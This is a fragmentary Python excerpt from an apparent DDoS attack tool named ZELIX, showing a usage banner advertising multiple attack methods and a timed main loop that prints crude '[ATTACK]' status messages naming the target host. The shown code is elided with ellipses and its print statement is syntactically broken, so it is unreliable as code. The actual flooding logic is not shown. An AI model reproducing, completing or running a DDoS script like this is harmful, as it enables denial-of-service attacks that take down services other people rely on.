...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* ZELIX - DDoS Attack Script With %d Methods\n'
...
if __name__ == '__main__':
      with suppress(KeyboardInterrupt):
          with suppress(IndexError):
              ...
              ts = time()
              while time() < ts + timer:
                  print(f'\033[37m[ATTACK] \033[31mFucked To Server > \033[34m{}:{}, \033[31mWith Methods > \033[34m{}.' format
                               (target or url.host,
